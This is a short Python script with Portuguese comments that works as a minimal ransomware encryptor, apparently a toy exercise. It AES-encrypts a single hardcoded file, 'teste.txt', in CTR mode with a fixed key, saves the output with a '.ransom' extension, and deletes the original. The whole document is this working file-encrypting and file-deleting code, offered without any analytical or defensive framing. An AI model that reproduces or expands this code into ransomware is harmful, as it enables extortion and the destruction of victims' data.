import os
import pyaes

def encrypt_file(file_name, key):
    """Criptografa um arquivo e salva com uma nova extensão."""
    try:
        with open(file_name, "rb") as file:
            file_data = file.read()

        # Criar a instância do AES e criptografar os dados
        aes = pyaes.AESModeOfOperationCTR(key)
        encrypted_data = aes.encrypt(file_data)

        # Nome do arquivo criptografado
        encrypted_file_name = file_name + ".ransom"

        with open(encrypted_file_name, "wb") as encrypted_file:
            encrypted_file.write(encrypted_data)

        # Remover o arquivo original
        os.remove(file_name)

        print(f"Arquivo '{file_name}' criptografado com sucesso!")
        print(f"Arquivo salvo como '{encrypted_file_name}'")

    except FileNotFoundError:
        print(f"Erro: O arquivo '{file_name}' não foi encontrado.")
    except Exception as e:
        print(f"Erro ao criptografar o arquivo: {e}")

if __name__ == "__main__":
    file_name = "teste.txt"
    key = b"testeransomwares"

    encrypt_file(file_name, key)
